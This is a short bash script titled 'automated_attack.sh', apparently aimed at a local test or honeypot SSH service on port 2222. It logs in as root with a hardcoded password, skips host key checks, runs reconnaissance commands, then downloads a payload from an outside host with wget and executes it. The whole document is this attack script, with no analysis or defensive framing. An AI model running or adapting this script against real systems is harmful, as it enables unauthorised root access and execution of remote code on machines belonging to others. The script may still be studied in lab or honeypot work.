nano automated_attack.sh

#!/bin/bash
sshpass -p '1234' ssh -o StrictHostKeyChecking=no root@127.0.0.1 -p 2222 << 'EOF'
whoami
uname -a
id
ifconfig
wget http://example.com/payload.sh
chmod +x payload.sh
./payload.sh
exit
EOF






